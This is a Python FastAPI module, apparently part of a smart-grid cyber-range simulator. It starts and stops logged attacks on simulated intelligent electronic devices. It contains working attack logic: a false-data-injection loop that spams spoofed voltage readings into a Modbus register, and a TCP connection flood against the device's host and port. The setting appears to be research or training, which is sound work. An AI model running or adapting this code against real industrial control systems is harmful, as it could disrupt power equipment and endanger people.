import asyncio
import time
import logging
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Dict, Any, Optional

logger = logging.getLogger("AttackAPI")
router = APIRouter()

class AttackCommand(BaseModel):
    attack_id: str
    attack_type: str
    target_ied: str
    params: Optional[Dict[str, Any]] = None

# Track active background tasks
# format: attack_id -> {"task": asyncio.Task | None, "start_time": float, "details": AttackCommand}
active_attacks = {}

async def execute_fdia_overvoltage(ied_id: str, voltage_pu: float, attack_id: str):
    """
    Background worker that continuously injects spoofed telemetry.
    Matches the old fdia_attack.py script but runs natively inside the backend.
    """
    from main import sim_engine
    
    # Scale the voltage_pu according to the Multiplier Method (x 1000)
    scaled_voltage = int(voltage_pu * 1000)
    logger.info(f"[*] Starting FDIA Task {attack_id} on {ied_id} targeting 1024 with {scaled_voltage}")
    
    try:
        while True:
            # We must spam faster than the 500ms physics tick to win the race condition
            # against the physics engine which will try to write the true value
            if sim_engine.is_running and ied_id in sim_engine.modbus.clients:
                client = sim_engine.modbus.clients[ied_id]
                if client.connected:
                    try:
                        # Write to Reg 1024 (%MW0) which IED reads as measured voltage
                        await client.write_register(address=1024, value=scaled_voltage, slave=1)
                    except Exception:
                        pass # Ignore individual write errors during spamming
            await asyncio.sleep(0.05) # 50ms spam rate
    except asyncio.CancelledError:
        logger.info(f"[*] FDIA Task {attack_id} cancelled cleanly.")

async def execute_ddos(ied_id: str, attack_id: str):
    """
    Background worker that floods the target IED with junk TCP connections
    to simulate a DoS attack, causing legitimate Modbus queries to queue and RTT to spike.
    """
    from main import sim_engine
    import socket
    logger.info(f"[*] Starting DDoS Task {attack_id} on {ied_id}")
    
    connections = []
    try:
        while True:
            if sim_engine.is_running and ied_id in sim_engine.modbus.clients:
                client = sim_engine.modbus.clients[ied_id]
                host = client.comm_params.host
                port = client.comm_params.port
                
                # Flood with raw TCP sockets
                for _ in range(20): 
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setblocking(False)
                        s.connect_ex((host, port))
                        s.sendall(b"GARBAGE_DATA_1234\n")
                        connections.append(s)
                    except Exception:
                        pass
                
                # Prevent crashing our own OS by rotating sockets
                if len(connections) > 300:
                    for s in connections[:100]:
                        try: s.close()
                        except: pass
                    connections = connections[100:]
                    
            await asyncio.sleep(0.01) # heavy spam
    except asyncio.CancelledError:
        for s in connections:
            try: s.close()
            except: pass
        logger.info(f"[*] DDoS Task {attack_id} cancelled.")

@router.post("/attack/start")
async def start_attack(cmd: AttackCommand):
    """
    Initiate a cyber attack against a target IED.
    Updates the global attack state for the historians and launches the active payload.
    """
    from main import sim_engine
    
    if not sim_engine.is_running:
        raise HTTPException(status_code=400, detail="Simulation not running.")

    if cmd.target_ied not in sim_engine.modbus.clients:
         raise HTTPException(status_code=404, detail="Target IED not connected.")

    if cmd.attack_id in active_attacks:
        raise HTTPException(status_code=400, detail="Attack already running.")

    # 1. Update Global Attack State for the Telemetry Writer (read by _tick)
    sim_engine.attack_state = {
        "active": True,
        "attack_type": cmd.attack_type,
        "grid_state": "UNDER_ATTACK",
        "attack_target": f"IED {cmd.target_ied}"
    }

    # 2. Write to InfluxDB (Discrete Event Logger)
    sim_engine.data_writer.write_attack_event(
        attack_id=cmd.attack_id,
        attack_type=cmd.attack_type,
        target_ied=cmd.target_ied,
        event="START",
        params=cmd.params,
        attack_duration_s=0.0
    )

    # 3. Launch specific attack payload
    if cmd.attack_type == "fdia_overvoltage":
        v_pu = cmd.params.get("injected_value", 1.20) if cmd.params else 1.20
        task = asyncio.create_task(execute_fdia_overvoltage(cmd.target_ied, v_pu, cmd.attack_id))
    elif cmd.attack_type == "ddos":
        task = asyncio.create_task(execute_ddos(cmd.target_ied, cmd.attack_id))
    else:
        task = None
        
    active_attacks[cmd.attack_id] = {
        "task": task,
        "start_time": time.time(),
        "details": cmd
    }

    return {"status": "started", "attack_id": cmd.attack_id}

@router.post("/attack/stop/{attack_id}")
async def stop_attack(attack_id: str):
    """
    Stops an active attack, cancels its background payload, and resets historian state.
    """
    from main import sim_engine

    if attack_id not in active_attacks:
        raise HTTPException(status_code=404, detail="Attack not found.")

    attack_entry = active_attacks.pop(attack_id)
    duration = time.time() - attack_entry["start_time"]
    cmd: AttackCommand = attack_entry["details"]

    # 1. Cancel background payload if exists
    if attack_entry["task"]:
        attack_entry["task"].cancel()

    # 2. Revert Global Attack State (if no other attacks are running)
    if not active_attacks:
        sim_engine.attack_state = {
            "active": False,
            "attack_type": "none",
            "grid_state": "NORMAL",
            "attack_target": "none"
        }

    # 3. Write Stop Event to InfluxDB
    sim_engine.data_writer.write_attack_event(
        attack_id=attack_id,
        attack_type=cmd.attack_type,
        target_ied=cmd.target_ied,
        event="STOP",
        params=cmd.params,
        attack_duration_s=round(duration, 2)
    )

    return {"status": "stopped", "attack_id": attack_id, "duration": round(duration, 2)}
